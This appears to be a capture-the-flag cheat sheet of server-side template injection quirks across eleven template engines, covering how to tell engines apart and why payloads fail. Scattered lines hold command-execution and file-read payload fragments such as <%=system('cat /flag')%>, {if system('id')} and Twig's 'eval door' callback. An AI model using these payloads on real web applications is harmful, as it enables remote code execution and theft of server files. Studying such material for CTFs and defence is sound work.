# Engine quirks — the oddities that break your payloads

Per-engine edge-cases — the reasons "the right payload" fails.

---

## Jinja2 quirks

```text
- {{'7'*7}}  → '7777777' — string*int = repeat — PYTHON result
  not '49' — the discrimination relies on it
- {{undefined}} → renders EMPTY — silent — no error — masks typos
- {{undefined.attr}} → UNDEFINED-error — accessing attr of
  undefined DOES error — silent-vs-noisy boundary
- {{x[0]}} on dict → KeyError; {{x.0}} → index-lookup — both work
- {{range}} vs {{range()}} — the name renders <function range>
  — call it for the list
- {{config}} → the whole Config — renders as dict — keys leak
- {{self}} → <TemplateReference> — attrs walk into the context
- |safe marks output unescaped — rendering-into-HTML differences
- {% set %} without = → block-set: {%set x%}body{%endset%}
- autoescape ON in .html — OFF in .txt — the flag may HTML-encode
  in html-render — flag{&lt;...&gt;} — check the extension
- {{''}} literal empty-string renders as nothing — use it for
  attr-walks where a value-object is needed: ''.__class__ → str
```

## Twig quirks

```text
- {{'a'+'b'}} → 0 — numeric + on strings — THE discriminator
- {{7*'7'}} → 49 or error — PHP coerces — varies by version
- {{x.y}} → attr then method then array — lookup-order
- {{_self}} → the TEMPLATE not context — ._self.env for engine
- |map|filter|sort take callables — 'system' is callable!
- {{['x']|map('fn')}} — the callable-in-map pattern
- twig 1.x _self.env.registerUndefinedFilterCallback — the eval door
- constant('X') — the constant fn — const leaks
- {{include}} / {{source}} — loader reads
- ~ concat: {{'a'~'b'}} — preferred concat
- |e escape-filter default — html-render escapes output
```

## FreeMarker quirks

```text
- ${x} on undefined → TemplateException — NOISY — not silent
- ${x!''} → default-operator — silence it: ${fake!''}
- ?api gated by api_builtin_enabled — false → ?api errors
- ?new gated by TemplateClassResolver — SAFER blocks most
- ${'x'?eval} — eval builtins — version+config gated
- <#include> reads through the loader — template-path only
- ${.version} ${.data_model} ${.env} — FM builtins inventory
- square-syntax [#if x] — alternate delimiters — config may set
- ${.now} — always-bound — detection probe
```

## Velocity quirks

```text
- $x silent-fails → renders "$x" literal or empty — config
- $!x → quiet-reference — empty instead of "$x" — devs write $!
- #set #if #foreach — directives — work even when $-ref silent
- SecureUberspector gates .class/getClass/forName by default in
  newer versions — $class/$render tools are the alternate
- #include/#parse — file-read directives — parser-level
- $x.class vs $x.getClass() — same property-path — same gate
- VTL grammar strict — missing-brace stops render
- context objects — $request/$response/$session/$application
  bound only if the app added them
```

## Thymeleaf quirks

```text
- *{} only inside th:* attrs — input must reach an ATTRIBUTE
- __${x}__ preprocessing — evaluates the inner FIRST —
  the fragment-name injection
- ${x} vs *{x} vs #{x} — variable/selection/message exprs —
  three dialects — #{x} resolves MESSAGE keys not vars
- beans bound? — th:text="${beans.x}" — spring-el full
- T(x) static-reach — SpEL type-function — needs SpEL not ognl
- th:utext vs th:text — unescaped-vs-escaped — output encode
- th:replace/th:insert — fragment-include — file-adjacent
```

## ERB quirks

```text
- <%= %> = output-expr — <% %> = statement — different tags
- `backticks` exec — %x() exec — system() prints to server-stdout
  NOT the page — %x/backtick return the output — common mistake:
  <%=system('cat /flag')%> renders "true" not the file
- raise → error-page renders content — <%=raise File.read('f')%>
- h() / html_escape / raw — output-encoding helpers
- cookies/session bound? — <%=cookies%> <%=session%>
- params bound — <%=params%> — re-echoes your input
```

## EJS quirks

```text
- <%= %> escaped / <%- %> raw — flag-bytes differ — entity-enc
- <% %> statements — full JS — require may work inside
- process/global may not be bound into data — the constructor
  chain reaches them anyway
- include(path) — file-as-template — include('/flag') —
  reads then renders — flag's {} may break the parse
- locals — the data dict — if bound: <%=locals%>
- ejs.render vs ejs.renderFile — string-vs-file — different bugs
```

## Smarty quirks

```text
- {php} needs security OFF or old-version — CTF shapes turn it on
- {if x} — the condition EVALS — {if system('id')} — works
  regardless — the underrated one
- {math equation='X'} — evals X — pre-3.1.30
- {$smarty.*} — super-global-tree — const/server/get/post/session
- {include file='x'} — template-include — file-adjacent
- |modifier syntax — {x|modifier} — php-functions as modifiers
```

## Liquid quirks

```text
- {{7*7}} literal — NO arithmetic — the missed-detection
- |times:7 |plus:7 — filter-math — the real probes
- Drop-model gates attrs — only whitelisted fields render
- site/page/shop/settings binds — app-defined context
- {% include %} — _includes-dir bound
```

## Handlebars quirks

```text
- {{7*7}} literal — no arithmetic — same trap
- {{lookup this 'x'}} — dynamic-key — the escape helper
- {{this.constructor}} → proto-walk — version-gated access
- {{@root}} — root-context — flag-binds leak
- custom helpers — app-defined — the real exec-surface
- {{{x}}} raw-output — encoding difference
```

## Mako quirks

```text
- ${x} expression — <% code %> statements — <%! module-level %>
- ${self} — differs from jinja — self.body/self.attr
- <%page args> — page-args — bound-vars
- <%namespace> <%include> <%inherit> — file-ops
- <%! import os %> — MODULE-LEVEL imports — full python
- ${x} on undefined → NameError — noisy
```

## Velocity-vs-FreeMarker confusion tell

```text
${x} fires in BOTH → which? — the ERROR text:
  freemarker.core... → FM
  org.apache.velocity... → Velocity
or the SILENT behavior:
  FM throws on undefined — Velocity renders $x literal or empty
${x!''} — FM-default-operator silences; Velocity ignores it
$x!y — Velocity-quiet-ref — FM doesn't know it
```
